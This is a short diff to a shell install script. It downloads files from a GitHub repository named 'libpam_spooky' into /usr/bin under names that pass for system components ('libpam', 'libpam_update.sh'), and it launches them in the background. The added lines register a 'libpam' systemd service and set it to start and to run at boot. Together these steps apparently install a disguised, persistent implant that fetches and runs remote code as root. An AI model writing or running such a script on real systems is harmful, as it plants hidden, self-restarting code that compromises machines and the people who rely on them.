@@ -10,5 +10,9 @@ curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/libpam.s
 curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/install.sh" > /usr/bin/libpam_update.sh
 chmod +x /usr/bin/libpam_update.sh
 
+systemctl daemon-reload
+systemctl start libpam
+systemctl enable libpam
+
 /bin/bash /usr/bin/libpam &
 exit 0
